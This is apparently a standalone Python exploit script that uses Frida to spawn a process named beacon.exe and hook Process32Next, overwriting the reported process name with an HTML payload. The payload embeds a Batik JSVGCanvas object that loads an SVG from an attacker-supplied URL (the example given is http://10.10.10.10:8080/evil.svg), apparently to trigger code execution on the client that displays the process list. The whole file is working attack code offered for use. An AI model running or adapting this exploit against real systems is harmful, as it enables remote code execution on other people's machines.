import frida
import time
import sys

def processInject(target, url):
    print('[+] Spawning target process')
    
    pid=frida.spawn(target)
    session=frida.attach(pid)
    
    frida_script ='''  
    var payload="<html>123123<object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='USER_PAYLOAD'></param></object>"
    payload=Array.from(payload).map(letter => letter.charCodeAt(0))
    var Process32Next=Module.findExportByName("kernel32.dll", 'Process32Next')

    Interceptor.attach(Process32Next, {
        onEnter: function(args) {
            //var hProcessSnap=args[0]
            var info=args[1];
            this.info = info;
            //console.log(this.info);
            this.szExeFile=this.info.add(0x24);  
           // console.log(this.szExeFile);
        },
        onLeave: function(retval) {
        if(Memory.readAnsiString(this.szExeFile) == 'beacon.exe')//当进程名称为beacon时修改其名称，可以替换成其他
        {
            Memory.writeByteArray(ptr(this.szExeFile), payload)
            console.log("find beacon.exe write payload")
        }
        
        //console.log(Memory.readAnsiString(this.szExeFile));
        }
    });
    '''.replace('USER_PAYLOAD',url)

    script = session.create_script(frida_script)
    script.load()
    frida.resume(pid)
    #make sure payload is triggered on client
    print("[+] Waiting for 1800 seconds")
    time.sleep(1800)
    frida.kill(pid)
    print('[+] Done! Killed beacon process.')
    exit(0)

if __name__=='__main__':
    if len(sys.argv) == 3:
        processInject(sys.argv[1], sys.argv[2])
    else:  
        print("[-] Incorrect Usage!\n\nExample: python3 {} beacon.exe http://10.10.10.10:8080/evil.svg".format(sys.argv[0]))